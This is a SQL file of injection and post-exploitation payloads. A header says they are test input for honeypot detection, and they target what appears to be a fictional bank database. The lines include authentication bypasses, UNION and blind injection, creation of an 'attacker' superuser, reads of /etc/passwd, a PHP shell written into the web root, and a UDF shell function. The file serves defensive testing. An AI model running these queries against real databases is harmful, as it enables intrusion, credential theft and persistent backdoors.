-- Common SQL injection payloads for honeypot testing
-- These represent typical attack patterns that honeypots should detect

-- Authentication bypass attempts
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
SELECT * FROM users WHERE username = 'admin'/**/AND/**/password = '' OR 1=1#;
SELECT * FROM users WHERE username = 'admin' AND password = '' OR 'x'='x';
SELECT * FROM users WHERE username = 'admin' AND password = '" OR 1=1 --';

-- Union-based injection attempts
SELECT username FROM users WHERE id = 1 UNION SELECT password_hash FROM users;
SELECT * FROM accounts WHERE user_id = 1 UNION SELECT table_name FROM information_schema.tables;
SELECT account_number FROM accounts WHERE id = 1 UNION SELECT version();

-- Information gathering queries
SELECT @@version;
SELECT user();
SELECT database();
SELECT @@datadir;
SHOW DATABASES;
SHOW TABLES;
DESCRIBE users;
DESCRIBE accounts;
SELECT table_name FROM information_schema.tables WHERE table_schema = database();
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';

-- Time-based blind injection
SELECT * FROM users WHERE id = 1 AND (SELECT SLEEP(5));
SELECT * FROM users WHERE id = 1 AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C);

-- Error-based injection
SELECT * FROM users WHERE id = 1 AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT(version(),floor(rand(0)*2)));
SELECT * FROM users WHERE id = CAST((SELECT database()) AS SIGNED);

-- Privilege escalation attempts
SELECT * FROM mysql.user;
CREATE USER 'attacker'@'%' IDENTIFIED BY 'password123';
GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%';
INSERT INTO mysql.user VALUES ('localhost','attacker',PASSWORD('pass'),'Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','','','','',0,0,0,0,'','','N');

-- File system access attempts
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');
SELECT 'malicious content' INTO OUTFILE '/tmp/hack.txt';
SELECT 'backdoor' INTO OUTFILE '/var/www/html/shell.php';

-- Data exfiltration attempts
SELECT GROUP_CONCAT(username,':',password_hash) FROM users;
SELECT HEX(password_hash) FROM users WHERE username = 'admin';
SELECT account_number, balance FROM accounts ORDER BY balance DESC;

-- Database structure discovery
SELECT table_name, table_rows FROM information_schema.tables WHERE table_schema = 'SecureBank';
SELECT CONCAT(table_schema,'.',table_name) FROM information_schema.tables WHERE table_schema != 'information_schema';

-- Advanced persistent threat patterns
CREATE TABLE IF NOT EXISTS backdoor (id INT, data TEXT);
INSERT INTO backdoor VALUES (1, 'persistence_established');
CREATE FUNCTION shell RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT shell('whoami');

-- NoSQL injection patterns (for MongoDB honeypots)
-- db.users.find({username: {$ne: null}, password: {$ne: null}})
-- db.users.find({$where: "this.username == 'admin' || '1'=='1'"})

-- Common attack tool signatures
-- sqlmap user agent patterns
-- Havij attack patterns
-- Manual injection attempts
